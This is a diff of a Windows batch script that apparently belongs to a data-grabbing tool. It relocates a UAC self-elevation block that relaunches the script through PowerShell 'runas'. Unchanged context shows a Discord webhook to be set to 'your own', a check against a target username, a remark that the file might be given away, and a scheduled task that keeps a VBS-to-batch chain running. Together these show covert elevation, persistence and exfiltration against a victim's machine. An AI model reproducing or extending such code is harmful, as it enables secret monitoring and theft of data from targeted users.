@@ -4,6 +4,13 @@
 
 goto remove_this_if_you_agree_to_follow_the_TOS
 
+:: If using onlogin on task scheduler use this - Might give away your file though - You don't need administrator for anything else currently.
+goto skipadministrator
+if not "%cd%"=="%vpath%" (
+	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+)
+:skipadministrator
+
 :: SET WEBHOOK | EDIT TO YOUR OWN WEBHOOK
 :: --------------------------------------
 set "webhook=https://discord.com/api/webhooks/"
@@ -299,13 +306,6 @@ IF "%USERNAME%"=="%targetusername%" (
 
 :dontremoveme
 :skipupdateconfig
-
-:: If using onlogin use this - Might give away your file though
-goto skipadministrator
-if not "%cd%"=="%vpath%" (
-	if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
-)
-:skipadministrator
 
 :: Make a scheduled task so the VBS -> Batch be ran every X 
 >NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
